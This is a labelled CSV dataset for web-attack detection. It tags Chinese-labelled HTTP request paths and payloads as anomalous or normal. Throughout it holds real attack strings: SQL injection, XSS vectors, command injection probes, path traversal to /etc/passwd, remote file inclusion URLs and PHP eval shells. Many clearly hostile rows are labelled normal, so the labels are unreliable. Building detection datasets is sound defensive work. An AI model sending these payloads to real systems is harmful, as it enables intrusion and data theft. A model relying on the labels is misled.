label,content
异常,/scripts/qbch5ojumj32.cfm
异常,/help.php?q=";uname >q49727674 #
异常,/main.php?logout='&sleep\x0910\x09#
异常,echo%20AGIYMZ$((69%2B52))$(echo%20AGIYMZ)AGIYMZ
正常,/gc_1161033356413/
异常,/main.php?stuff="\x0adel q16731133 #
异常,/help.php?q="|ping\x09-w\x097000\x09-n\x091\x094.3.2.1|rem\x09
异常,/en-us/odzk29aa.pl?<meta http-equiv=set-cookie content="testtfvh=2141">
正常,/143639/
异常,/awstats/awstats.pl?migrate=|echo;echo x;echo|awstats557139.txt
正常,/msblast/
正常,/tag and rename v2/
正常,/javascript/broker.tmp
异常,<script>document.cookie="testlihk=7070;"</script>
异常,/<img src="javascript:alert(cross_site_scripting.nasl);">.html
正常,/supportstopzillaq6/
正常,/000109727/
正常,/captcha_fb92441508931b2c0acafb214a5a2820/
正常,/javascript/amanda.pdf
异常,/comments.php?scriptpath=http://192.168.202.96:8080/4dckqcc0acprbz??
正常,/042183/
异常,/examples/jsp/jsp2/jspx/myevent.php?myevent_path=/etc/passwd\x00
正常,/visitinghours/
异常,/javascript/adobe.exe
正常,/ipsec-vpn/
正常,/l0ldu0lkq1rpn29na21du1evb0tvuufbsvfnakzjqufraenfsvfqr0vkemdbis80skzpq28wzwgxawnvblfwr2hklxnjynprqsehlzdfmf8xrjavodk4mzm2/
正常,/setup2-small/
正常,"/main.php?stuff=ping,-w,9000,-n,1,4.3.2.1&rem,"
异常,/wp-login.php?action=-1062%27%29%20UNION%20ALL%20SELECT%203903%23
正常,/anfsflogo/
正常,/child_protection/
异常,ORDER BY 12 
异常,/admin/include/header.php?repertoire=XXpathXX?
正常,/mp_geek/
正常,/festivecats_0/
正常,/neighbours/
正常,/naboard_pnr.php?skin=http://192.168.202.96:8080/4dckqcc0acprbz??
正常,/include.php?sunpath=http://cirt.net/rfiinc.txt?
正常,/phpmychat.php3?=http://192.168.202.118:8080/2aibfaczmac8??cmd=id
异常,/mpcgi/msmmask.exe?mask=/junk334
异常,')print(`echo%20OFKEZB;echo%20$((35%2B78));echo%20OFKEZB;echo%20OFKEZB`)%3B%2523OFKEZB
异常,/main.php?logout="\x0adel\x09q98198938\x09#
正常,/165257/
异常,/main.php?logout="rm\x09q46762746\x09#
正常,/javascript/console.as
正常,/borderedbox/
异常,%2527%0A%20str%3D%24%28echo%20JZOJBE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F
异常,/ywaxntrx.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/000032015/
正常,/cacti-debian/
正常,/2703407/
正常,/coscoenduratable/
正常,/tomcat_proxy_directory_traversal.nasl1331904241
异常,echo$IFSBPKGGQ$((2%2B10))$(echo$IFSBPKGGQ)BPKGGQ
异常,/regcheck.php?item=-8981%29%20ORDER%20BY%201%23&email=undefined&ajax_request=1488931246062
正常,/113a2c158279ced16c444f34a72aaca5-l/
正常,/main.php?pageurl=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/ic_vts/
正常,/lib/classes/swift/characterreader/c99.php
正常,/fidb57652876a29010872be7fa73b21552caa8a5c5f/
正常,/examples/servlets/servlet/wsisa.dll/wservice=wsbroker1/webutil/ping.p
正常,/2171792/
正常,/docs40a1/
正常,/javascript/webwork.ini
异常,/chat.php?CONFIG[MWCHAT_Libs]=XXpathXX?
正常,/javascript/crossdomain.py
正常,/58266620/
正常,/question172/
正常,/floral_dress/
正常,/config.php?returnpath=http://192.168.202.118:8080/zz5thkvtmlgl?
正常,/coldfusion_apache_double_null_info_disclosure.nasl-1331923193%00.cfm
异常,/15_cscript/
异常,/o6ebbirj.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,"/faq.php?action=&type=view&s=&id=-1' union select 0,1005695442,0,0,0,0,0--"
正常,/des-dar2_03/
正常,/rgrant/
异常,%7Cecho%20PUCKTG$((40%2B18))$(echo%20PUCKTG)PUCKTG%22
异常,/podcastgen1.0beta2/core/admin/showcat.php?absoluteurl=XXpathXX
异常,%7C%20%5B%205%20-ne%20%24%28echo%20JNNROP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//
正常,/neil diamond - the christmas album/
正常,/admin/code/index.php?load_page=http://192.168.202.96:8080/frznctvhi0i5?
正常,/javascript/apache/
异常,/examples/servlets/servlet/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
正常,/001465/
异常,/azcrfs8d.fts?<script>document.cookie="testjpdr=9205;"</script>
异常,/copying/</p><body><script src=http://www.example.com/test?rnd=q11971667></script><p>
正常,/calendar.php?vwar_root=http://192.168.202.96:8080/txenjrxf3??
异常,/examples/servlets/servlet/admin/admin.php?sid=0'
异常,/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904208')</script>
正常,/20050127-4/
正常,/main.php?stuff=|ping\x0b-w\x0b11000\x0b-n\x0b1\x0b1.2.3.4|rem\x0b
异常,/oie504mr.asp?<script>document.cookie="testtpby=7052;"</script>
正常,/javascript/important.orig
异常,%2522%3B%20str%3D%24%28echo%20GJYXKU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526
正常,/lutes_gifts/
异常,%27%20or%201=1
正常,/javascript/env.swf
正常,/javascript/releases.lst
正常,/novembers doom - the pale haunt departure/
异常,/search.jsp?q=%"<script>alert(1332008324)</script>
异常,/o6ebbirj.mscgi?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,%3B%20str%3D%24%28echo%20MJSZOL%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//
正常,/motionresealing/
正常,/000103570401000210/
异常,[test](javascript://%0d%0aprompt(1);com)
异常,"/en-us/account/calendar.php?month=' union select 1,1,'1331909343','calendarix_month_sql_injection.nasl',1 #"
异常,/include/footer.php?t_login=<script>alert("xsstest")</script>
正常,/20040520-20/
正常,/t030logo/
正常,/colorado_gifts/
异常,%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20JWEAWE%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26
正常,/weeping willows - broken promise land/
异常,/help.php?q=';del\x09q84185561\x09#
正常,/300053688390/
正常,/redirector/
正常,/dvdauthor/
正常,/colinatxmas/
异常,/9o6g5vkn.pl?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/u_170s1t/
正常,/125494/
正常,/0072121041/
正常,/defines.php?webchatpath=@rfiurl?webchatpath=@rfiurl?
异常,/ygkjkngd.dll?<meta http-equiv=set-cookie content="testnago=4518">
正常,/001264/
异常,/common.php?livealbum_dir=XXpathXX?
正常,/csnews/
正常,/examples/jsp/jsp2/el/b2-tools/gm-2-b2.php?b2inc=http://xxxxxxxx
异常,/javascript/fs.exe
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FXPFKU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
正常,/el amor es lo que tiene tc scree xvid mp3/
异常,"/cgi/htimage.exe/path/filename?2,2"
正常,/my voice diary/
正常,/rhashii/
异常,/scripts/d3z7yywpyeoa.sh
正常,/3650906/
正常,/examplefile.php?bibtexrootrel=http://192.168.202.96:8080/4dckqcc0acprbz??
正常,/content/delete.php?pwfile=http://192.168.202.118:8080/ghl9il?
异常,/don't fuck this up/
异常,/webcgi/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
异常,"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink""><animation xlink:href=""javascript:alert(1)""/><animation xlink:href=""data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E""/><image xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E""/><foreignObject xlink:href=""javascript:alert(1)""/><foreignObject xlink:href=""data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E""/></svg>"
正常,/bittorrent_223690/
正常,/20060928-2/
正常,/manual/programs/configure.html
正常,/003605/
异常,<embed src=%(jscript)s></embed>
异常,%0aecho$IFSFXFLFR$((67%2B52))$(echo$IFSFXFLFR)FXFLFR%27
正常,/motley crue - live in winnipeg 07 apr 2005/
异常,"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>"
异常,/ExhibitionCenter.aspx?area=-12'%20and/**/1=char(106)/**/--
正常,/javascript/team.java
正常,/examples/jsp/colors/disp_album.php?id_album=0+or+1=1
正常,/box-features/
异常,"/main.php?stuff=""ping,-w,11000,-n,1,4.3.2.1|rem,"
异常,/nmw0do67.htm?<script>cross_site_scripting.nasl</script>
正常,/1-1999/
正常,/x86freefontfile/
正常,/javascript/formmail.bat
异常,/test.php?evalme=eval($_server[http_x_mlalorkmeliqovbay]);
正常,/040101jir/
正常,/050359/
正常,/20051017-7/
正常,/oklahoma city murrah building bombing evidence/
异常,/5o9zq43e.jsp?<script>cross_site_scripting.nasl</script>
异常,/myhome/do.php?ac=-6605%25%27%29%20UNION%20ALL%20SELECT%205225%2C%205225%2C%205225%2C%205225%23&ref
正常,/6162110/
正常,/lib/classes/swift/events/eventdispatcher.php.old
异常,<script>document.cookie="testydan=5106;"</script>
正常,/monocle/
正常,/ad335501a4fa/
正常,/screenshots-ssdlx/
正常,/common/db.php?commonpath=http://192.168.202.118:8080/tzhfyzkbomspvm??
异常,%0A%20str%3D%24%28echo%20GOUIRV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20
正常,/rphostingplans/
正常,/satoroams/
正常,/editsite.php?returnpath=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/manager/more.php?id=1'
正常,/javascript/tuscany.bz2
正常,/admin/includes/admin_header.php?level=http://192.168.202.96:8080/ipb5ri??
正常,/cat_news/
正常,/latex.php?bibtexrootrel=http://cirt.net/rfiinc.txt??
正常,/config/config_member.php?inc=http://192.168.202.118:8080/moclyxlwqyfjnp??
异常,/60/include/online.php?jsoncallback=%3Ciframe/onload=alert(/webscan/)%3E
正常,/gallery/displaycategory.php?basepath=http://192.168.202.96:8080/whmch8ftkt7kv?
异常,/6dlc2zm9.mscgi?<script>document.cookie="testqpux=4016;"</script>
正常,/spiegeltv- mayday alarm im cockpit3  xvid by slin for www/
正常,/index.php?from=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TABXYH%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
异常,/examples/jsp/jsp2/jspx/snpfiltered.pl?t=c&u=<script>foo</script>
正常,/ipallocation/
正常,/examples/jsp/jsp2/el/nmap.php?target=|id
异常,/javascript/cache.exe
异常,<svg><a xyz:href=123><text>test</text></svg> 
正常,/prism no 6 vol 4 - fatwa on saddam hussein/
异常,/javascript/show.exe
正常,/sharka-surfing/
正常,/129767/
异常,/en-us/<img src="javascript:alert(cross_site_scripting.nasl);">.php
异常,/BetaBlockModules/AboutUserModule/AboutUserModule.php?path_prefix=XXpathXX
异常,%0A%20str%3D%24%28echo%20NETEBT%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F
正常,/javascript/purchasing.shtml
正常,/1165685751821/
正常,/santa-tracker/
异常,/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\x00
正常,/a1993737/
正常,/cgi-bin/blog/
正常,/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1984048408--
正常,/index.php?ext=http://192.168.202.118:8080/ghl9il?
异常,/main.php?stuff="ping\x0b-w\x0b11000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b
异常,/script/ident/identification.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/17335/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
异常,/%22http:////wpa.qq.com//msgrd?uin=%A1%BEQQ%BA%C5%A1%BF&site=%A1%BE%CD%F8%D5%BE%C3%FB%B3%C6%A1%BF&menu=yes%5C%22&v=3%3Cscript%20src=$%7Bdom_xss_url%7D%3E%3C/script%3E
正常,/someunexistantantsutff12618883511079395623.html
正常,/fonts for mac os x/
正常,/examples/jsp/num/configuration/galleryconfig.txt
正常,/examples/jsp/colors/mapserv?map=mapserver_detect.nasl.map
正常,/sitebar/index.php?writerfile=http://cirt.net/rfiinc.txt?
异常,<!--#echo var="script_uri" -->
异常,"/examples/jsp/cal/faq.php?action=&type=view&s=&id=-1' union select 0,717118813,0,0,0,0,0--"
异常,${passthru(print(`echo%20ZKPFXS\necho%20$((3%2B17))\necho%20ZKPFXS\necho%20ZKPFXS`)%3BZKPFXS
正常,/wisser/
异常,/scripts/rvckwz6smkqf.html
异常,/examples/jsp/error/index.php?id=urjhxcl19w'
异常,/vmi8bb12.php3?<meta http-equiv=set-cookie content="testlerc=2575">
正常,/level510/
异常,<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
异常,"/myhome/connect.php/picture.php?cat=0&image_id=-999%20and%20if(1=1,benchmark(5000000,md5(7)),1)"
正常,/744_th/
异常,<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/><animate attributeName="onunload" to="alert(1)"/></svg>
正常,/euweeedirective/
正常,/kennyg_ live/
正常,/goldene-hochzeit/
正常,/greenbox/
正常,/goldbox2/
正常,/infoauthors_02/
正常,/examples/jsp/num/search.cfm
正常,/fidd8dde777b69623aefd8a2e67b3c403b27828a1d9/
异常,/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+5b+e8+57+00+00+00+01+d3+5e+5a+5f+58+ff+e3+e8+ed+ff+ff+ff+7f+e9+f1+6f+57+69++>>ctdn
正常,/sites/default/images/5885793560407489337
正常,/config/config_main.php?inc=@rfiurl?inc=@rfiurl?
正常,/148636303/
异常,/LoginCheck4.asp?LoginLb=jwc&Account=1'%20AND%201=CHAR(106)%20--&PassWord=0
异常,hi' or 'a'='a
异常,/modules/files/list.php?full_path=XXpathXX
异常,/forum1_professionnel.asp?n=1771&amp;nn=c:\boot.ini&amp;page=1
异常,/en-us/hipkz026.kspx?<script>document.cookie="testyrbs=2855;"</script>
正常,/2002577498_kay24/
正常,/print.php?print=http://192.168.202.96:8080/4dckqcc0acprbz??
正常,/javascript/helpers.pem
异常,/index.php?dir=<script>alert(412105577658)</script>
异常,/myhome/space.php?id=-8895%29%20UNION%20ALL%20SELECT%209408%2C%209408%2C%209408--%20
正常,/javascript/wp-includes.bin
正常,/exchangenews/
正常,/verwertungsgesellschaften_nutzerorganisationen/
正常,/239067232/
正常,/classified_right.php?language_dir=http://192.168.202.96:8080/txenjrxf3?
异常,/index.php?catid='abc
异常,/examples/jsp/num/file.php?path=/etc/passwd\x00
正常,/javascript/unreg.part
正常,/javascript/1994.class
正常,/australiaflag/
异常,/examples/jsp/jsp2/el/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd\x00
正常,/fotocamere-digitali/
正常,/tkr_down/
正常,/_derived/
正常,/189764/
正常,/videogames/
正常,/shoscomb/
异常,%0aecho$IFSVXZGNO$((12%2B40))$(echo$IFSVXZGNO)VXZGNO\
正常,/poems03112006/
正常,/yanan amciklar turkish xxx movie mvcd dvd rip/
正常,/mac_sysadmining/
正常,/1444245227/
正常,/20030804-3/
正常,/drake of the 99 dragons_information/
正常,/96-0001/
正常,/lib/classes/swift/characterreaderfactory
异常,/g8nu2yy7.jsp?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/accessories-categories/
正常,/csoghoian/
正常,/officedesigns/
异常,%3B%20str%3D%24%28echo%20UBLMDF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C
正常,/askbloggie/
正常,/2040576040/
正常,/examples/jsp/colors/index.php?edit=nonexistant1840949072
异常,"/scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332009307','5'--"
异常,%22%3B%20str%3D%24%28echo%20TLXEJK%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22
正常,/46352458ivjjfs_th/
异常,/javascript/p.exe
正常,/javascript/downloader.cc
正常,/visionman_logo/
正常,/emitopic8/
正常,/nt4ras/
正常,/s-search/
正常,/qt-applets/
正常,/stanfordsports/
正常,/release_courts20060928/
正常,/rogers_asteroid/
正常,/stockjunk/
正常,/examples/jsp/cal/calendar.html
异常,/jujgxwav.pl?<script>document.cookie="testknim=9383;"</script>
异常,/main.php?logout="&ping\xa0-w\xa011000\xa0-n\xa01\xa04.3.2.1&rem\xa0
异常,"/examples/jsp/num/index.php?op=default&date=200607' union select 1,742994120,1,1,1,1,1,1,1,1--&blogid=1"
正常,/javascript/status.gz
异常,/uc/avatar.php?uid=-3808%22%20UNION%20ALL%20SELECT%206206%2C%206206--%20
异常,/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://192.168.202.118:8080/zz5thkvtmlgl?
正常,/audio books terry pratchett discworld books 16-27 pgac/
异常,/0w155a7c.nsf?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/challenge_cup/
正常,/config/config_admin.php?inc=http://192.168.202.118:8080/tzhfyzkbomspvm??
异常,%3B%20str%3D%24%28echo%20OHOHHT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C
异常,/web/BetaBlockModules/NetworkModerateUserModule/NetworkModerateUserModule.php?path_prefix=XXpathXX
正常,/narciss/
正常,/einstein_small/
正常,/examples/jsp/jsp2/jspx/member.php?action=login
异常,/..........................................................................\..\..\{FILE}
正常,/article452/
正常,/posters3for999/
正常,/footer-nav_02/
异常,/help.php?q=';uname >q95782248 #
异常,/j4rdyhw8.jsp?<script>document.cookie="testrluj=1420;"</script>
正常,/leftside_graphics/
正常,/business construction and maintenance design/
正常,/aa384642/
正常,/zxjdbc/
正常,/lib/classes/swift/plugins/reporterplugin.php.1
异常,/prescription-xanax/
正常,/scanrand_logs/
正常,/emperor rotmk/
异常,/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=XXpathXX?
异常,/qur'an-r0/
正常,/javascript/standalone.gz
正常,/ross_andersons/
正常,/sources/misc/new_day.php?path=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/examples/jsp/cal/data/fetch.php?page='
异常,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
正常,/javascript/management.asp
正常,/158070/
正常,/nsb33-114b2/
正常,/javascript/avatars.gif
异常,/akarru.gui/main_content.php?bm_content=XXpathXX
正常,/free-sudoku_7917/
正常,/karakurt/
异常,/subscriptions.cs
异常,%7C%20%5B%208%20-ne%20%24%28echo%20HHUNZT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526
异常,;echo%20UKKXOY$((15%2B70))$(echo%20UKKXOY)UKKXOY
正常,/baldur gate ii collection [pc ita] [by tntvillage/
正常,/admin/setup/level2.php?dir=http://192.168.202.118:8080/ghl9il?
正常,/07ecom/
正常,/133030/
正常,/0144fcc/
异常,/wp-login.php?redirect_to=http%3A%2F%2Fwww.lawqt.com%2F5029.html
异常,/x2gyorli.do?<meta http-equiv=set-cookie content="testwhac=3130">
异常,/edv3mapy.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/addictinggames2/
异常,%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20AUSQYM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F
正常,/javascript/dumps.cnf
正常,/javascript/bean
正常,/lib/classes/swift/mailer/arrayrecipientiterator.php.~1~
异常,/scripts/includes/converter.inc.php?include_path=/etc/passwd\x00
异常,<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
正常,/lib/classes/swift/mime/headers/index.jsp
正常,/peoplefindervolunteer/
正常,/javascript/~jacob.txt
正常,/moodle/admin/utfdbmigrate.php?cmd=@rfiurl
异常,/scripts/1hactwocbsuo.shtml
正常,/delphicb/
正常,/scrapbooking_w0qqfromzr4qqsacategoryz11788qqsocmdzlistingitemlist/
异常,/scripts/rtm.log
异常,/help.php?q=';sleep\x0911\x09#
正常,/javascript/sws.tar
异常,&#0000060
异常,@variable
正常,/javascript/mambo.xsl
正常,/113384/
异常,/sophie moon- one of her first hardcore's/
正常,/a16957056/
正常,/124192/
正常,/javascript/head.rar
正常,/lib/db/postgres.class.php?root=http://192.168.202.118:8080/2aibfaczmac8?
异常,GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
正常,/javascript/ws.msg
异常,/admin/header.php?loc=XXpathXX
异常,/top.php?stuff="del\x0bq81585151&rem\x0b
正常,/infomag/
正常,/pc - painkiller battle out of hell spanish/
正常,/birdie_webcam/
正常,/javascript/setting.pem
正常,/lupii2/
正常,/skype-released-toolbar-for-mozilla-firefox/
正常,/opensiteadmin/indexfooter.php?path=http://cirt.net/rfiinc.txt?\x00
正常,/recordings/modules/phprpc/server.php
异常,/jw64yq8u.exe?<meta http-equiv=set-cookie content="testylfu=1313">
异常,/javascript/.htaccess/'"
异常,/myhome/space.php?id=-7488%27%20UNION%20ALL%20SELECT%206840%2C%206840%2C%206840%2C%206840%2C%206840--%20
异常,/test.php?evalme=eval($_server[http_x_mbnqgczvafwyars]);
正常,/eva/index.php3?aide=http://192.168.202.118:8080/zz5thkvtmlgl??
异常,/scripts/nryr3lvrjnwx.php3
正常,/jenna haze swallow/
异常,/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
正常,/esm7rpmanual/
正常,/main/inc/is_cgi_installed3_main.php1766626063.tmp
异常,/recordings/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd
正常,/535651/
正常,/stevie ray vaughan-the sky is crying/
正常,/uselections2004/
异常,/Exophpdesk_PATH/pipe.php?lang_file=XXpathXX
异常,/examples/jsp/num/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini
正常,/049426/
异常,/en-us/account/home/search.asp?nchannel='1
异常,/fmnveedu.aspx?<script>document.cookie="testgfbr=7014;"</script>
正常,/lebara_anal/
正常,/chamillionaire & paul wall- get ya mind correct/
正常,/examples/jsp/cal/remotehtmlview.php?phpads_path=http://xxxxxxxx
正常,/2005693171019706065_rs/
正常,/mzi2mju5/
正常,/calea-compliance/
正常,/pc-cillin internet security 2005 v12/
异常,/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
正常,/google earth pro/
正常,/agenda.php3?rootagenda=http://192.168.202.96:8080/ipb5ri?
正常,/147942/
正常,/cvstoys/
正常,/javascript/sign.test
正常,/000040664/
正常,/convert/mvcw.php?step=1&vwar_root=http://192.168.202.118:8080/2aibfaczmac8?
正常,/betablockmodules/networkmoderateusermodule/networkmoderateusermodule.php?path_prefix=http://192.168.202.96:8080/llumt7msyau5y?
异常,/index.php?modpath=XXpathXX
正常,/j-over_1/
正常,/main.php?logout=&del\x09q12279742\x09#
异常,/cgi-bin/index.php?cat='
异常,/index.php?section=XXpathXX
正常,/25791d197f53bb15a9e77dddc1ccf098/
正常,/lr2005_homeleftcolumns/
正常,/javascript/upload.db
正常,/sonic animation - eleven/
异常,/315ts//?s=/abc/abc/abc/$%7B@print(eval($_POST[c]))%7D
正常,/javascript/j2ee.pl
正常,/atm-hacking/
正常,/20030226-3/
正常,/869239/
异常,/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://192.168.202.96:8080/txenjrxf3?\x00
正常,/c8d2m560n9jgh439zg4/
正常,/panel/flash/copy (2) of operator_panel.swf
正常,/library/js/jquery.treeview-1.3/images/tv-item.gif
正常,/clearinfo.php?bibtexrootrel=http://192.168.202.118:8080/tzhfyzkbomspvm??
正常,/mshamos/
正常,/825361/
正常,/javascript/edp.txt
正常,/die schluempfe_vol/
正常,/frasier 01x03 dinner at eight dvdrip xvid swesub/
正常,/?npage=-1&content_dir=http://192.168.202.96:8080/frznctvhi0i5?\x00&cmd=ls
正常,/god dethroned - the lair of the white worm/
正常,/en-us/manager/windows/admin/win-event-log-collections
正常,/javascript/systems.svn-base
正常,/martinez/
正常,/avi1005racer_75/
正常,/post6025/
正常,/cabir_b/
正常,/mzqzmjyx/
正常,/310000/
异常,/scripts/docs/changes
正常,/27858-1166120160/
异常,'%7Cecho$IFSKVFINL$((98%2B1))$(echo$IFSKVFINL)KVFINL
正常,/r-sjzt/
异常,/bl8sefdm.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/javascript/www.phtml
异常,/zmvq66jy.php?<script>cross_site_scripting.nasl</script>
正常,/nethome.as
正常,/102306gearhead/
正常,/q27944492
正常,/main.php?logout=&rm\xa0q82532752&rem\xa0
正常,/sample_resumes/
异常,"/examples/jsp/colors/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1"
正常,/phpmyadmin/index.php?token=d3fcb29d9865c874025dcd1e688cf453
正常,/phpmyadmin/login.cgi?username=&command=simple&do=edit&password=&file=|id|
正常,/blogcms/index.php?dir_plugins=http://192.168.202.96:8080/ipb5ri??
异常,/17335/index.php?product-%22%3E%3Ciframe%20src=javascript:window[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](42873)%20-1122-viewpic.html
正常,/swimming_w0qqfromzr4qqsacatz74050qqsocmdzlistingitemlistqqsspagenamezdcpsporttextnonfeat/
正常,/soaplist/
正常,/arelis/
正常,/newsprint-2341/
异常,<img src=`xx:xx`onerror=alert(1)>
正常,/radiocesko/
异常,/yef5f3d5.htm?<meta http-equiv=set-cookie content="testcrcv=6167">
正常,/spooks s i o s o s volume one 2000/
正常,/js/wptable-tinymce.php?abspath=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,/606wkcop.fts?<script>cross_site_scripting.nasl</script>
正常,/zabranjeno pusenje/
正常,/examples/jsp/jsp2/el/index.php?libdir=http://xxxxxxxx
异常,/path_script/createurl.php?formurl=http://192.168.202.118:8080/moclyxlwqyfjnp?
异常,/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd
正常,/abbastoc/
正常,/cd-speler/
异常,/manuscript/
